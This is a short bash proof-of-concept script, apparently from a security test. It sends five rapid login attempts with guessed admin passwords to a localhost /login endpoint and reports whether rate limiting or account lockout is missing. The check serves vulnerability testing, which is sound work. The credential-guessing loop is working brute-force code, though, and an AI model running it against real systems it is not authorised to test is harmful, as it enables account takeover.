#!/bin/bash

# POC: Brute Force Protection Missing on Login Endpoint
# This script demonstrates the lack of rate limiting, account lockout, or brute force protection
# on the /login endpoint. Multiple rapid authentication attempts all succeed without throttling.

TARGET_URL="http://localhost:8080/login"
ATTEMPTS=5

echo "=== Brute Force Protection Test on $TARGET_URL ==="
echo "Testing if login endpoint implements rate limiting or account lockout..."
echo ""

declare -a response_times
declare -a http_codes

for i in $(seq 1 $ATTEMPTS); do
    echo -n "Attempt $i: "
    
    # Measure response time and HTTP code
    start_time=$(date +%s%N)
    response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
        -d "username=admin&password=password$i" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --connect-timeout 5 --max-time 10)
    end_time=$(date +%s%N)
    
    # Parse response
    http_code=$(echo "$response" | tail -n1)
    response_time=$(( (end_time - start_time) / 1000000 ))  # Convert nanoseconds to milliseconds
    
    http_codes[$i]=$http_code
    response_times[$i]=$response_time
    
    echo "HTTP $http_code (${response_time}ms)"
    
    # Small delay between attempts to be respectful
    sleep 0.1
done

echo ""
echo "=== Results ==="
echo "All responses received: ${http_codes[@]}"
echo "Response times (ms): ${response_times[@]}"

# Check if all attempts succeeded with 302 (redirect)
all_302=true
for code in "${http_codes[@]}"; do
    if [ "$code" != "302" ]; then
        all_302=false
    fi
done

echo ""
if [ "$all_302" = true ]; then
    echo "[VULNERABLE] No brute force protection detected!"
    echo "- All $ATTEMPTS attempts returned HTTP 302"
    echo "- No rate limiting observed"
    echo "- No delays or throttling between attempts"
    echo "- Response times consistent (~${response_times[1]}ms)"
    exit 0
else
    echo "[PROTECTED] Rate limiting or account lockout detected!"
    echo "- At least one request was blocked or throttled"
    exit 1
fi